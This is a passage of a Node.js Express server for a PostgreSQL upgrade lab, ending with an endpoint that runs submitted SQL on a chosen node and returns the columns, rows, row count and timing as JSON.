      new: { primary: REL.new.primary, standby: REL.new.standby, subscriber: REL.new.subscriber, label: REL.new.label },
    },
    consoleNodes: ALL_PG_NODES.map((n) => ({ id: n.id, label: n.label || n.id })),
  });
});

app.post(
  '/api/sql/run',
  asyncRoute(async (req, res) => {
    const { node, sql } = req.body || {};
    if (!CONSOLE_NODES.has(node)) throw Object.assign(new Error(`unknown node "${node}"`), { status: 400 });
    const text = typeof sql === 'string' ? sql.trim() : '';
    if (!text) throw Object.assign(new Error('sql is required'), { status: 400 });

    const pool = pools.get(node);
    const start = Date.now();
    let result;
    try {
      result = await pool.query(text);
    } catch (err) {
      throw Object.assign(new Error(err.message), { status: 400 });
    }
    const elapsedMs = Date.now() - start;
    if (!result.fields || !result.fields.length) {
      res.json({ columns: null, rows: [], rowCount: result.rowCount, command: result.command, elapsedMs });
      return;
    }
    const columns = result.fields.map((f) => f.name);
    const truncated = result.rows.length > SQL_CONSOLE_ROW_LIMIT;
    const rows = (truncated ? result.rows.slice(0, SQL_CONSOLE_ROW_LIMIT) : result.rows).map((r) => columns.map((c) => r[c]));
    res.json({ columns, rows, rowCount: result.rowCount, command: result.command, truncated, elapsedMs });
  })
);

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`[app] pg upgrade lab listening on :${PORT}`));
